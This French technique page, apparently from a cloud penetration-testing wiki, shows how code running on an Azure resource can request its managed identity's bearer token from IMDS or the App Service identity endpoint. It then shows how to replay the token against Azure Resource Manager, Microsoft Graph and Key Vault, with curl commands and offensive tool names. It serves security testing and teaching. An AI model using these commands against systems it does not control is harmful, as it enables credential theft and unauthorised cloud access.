---
title: "Jeton d'identité managée : générer le jeton d'une ressource depuis IMDS"
description: "Demander un jeton d'accès pour l'identité managée d'une ressource au point de terminaison de jeton IMDS et le rejouer contre ARM ou Microsoft Graph."
keywords:
  - jeton d'identité managée
  - IMDS
  - jeton d'accès
  - ARM
  - Microsoft Graph
---

# Jeton d'identité managée

Une VM, une Function, un App Service ou un conteneur doté d'une identité managée peut demander à IMDS un jeton bearer pour cette identité. Avec une exécution de code sur la ressource, vous faites la même requête et repartez avec le jeton, puis le rejouez contre l'API de gestion Azure ou Microsoft Graph en tant que l'identité.

## Demander le jeton

```bash
# resource = the audience you want a token for
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'

# other audiences: https://graph.microsoft.com/ , https://vault.azure.net , https://storage.azure.com/
```

Sur **App Service / Functions**, il n'y a pas d'IMDS ; le point de terminaison d'identité est injecté à la place sous forme de variables d'environnement :

```bash
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
```

## Le rejouer

```bash
TOKEN=$(curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | jq -r .access_token)
# enumerate what the identity can reach
curl -s -H "Authorization: Bearer $TOKEN" 'https://management.azure.com/subscriptions?api-version=2020-01-01'
# or feed it to az
az account get-access-token >/dev/null 2>&1  # separate; or use the raw token with az rest --headers
```

## Notes d'exploitation

- Un jeton est par audience : générez-en un pour `management.azure.com` pour piloter ARM, un deuxième pour `graph.microsoft.com` pour les lectures d'annuaire, un troisième pour `vault.azure.net` pour lire Key Vault.
- Les identités assignées par l'utilisateur nécessitent le paramètre `client_id` ou `mi_res_id` quand une ressource en porte plusieurs ; sans lui, IMDS renvoie une erreur ou retourne l'identité assignée par le système.
- Le jeton dure généralement une heure environ et ne peut pas être rafraîchi depuis IMDS, donc redemandez-le plutôt que de le stocker.
- Ce que l'identité peut faire est une question de [RBAC](../../identity/managed-identities/index.md) ; le jeton n'est que la clé.

## Outils

- **curl** contre le point de terminaison.
- **MicroBurst** (`Get-AzPasswords`, utilitaires de style `Invoke-AzVMUserDataAgent`) et **az rest** pour rejouer les jetons.

## Références

- [Microsoft : obtenir un jeton avec une identité managée](https://learn.microsoft.com/azure/active-directory/managed-identities-azure-resources/how-to-use-vm-token)
- [HackTricks Cloud : jeton IMDS Azure](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [SpecterOps : chemins d'attaque par identité managée (BARK)](https://github.com/BloodHoundAD/BARK)
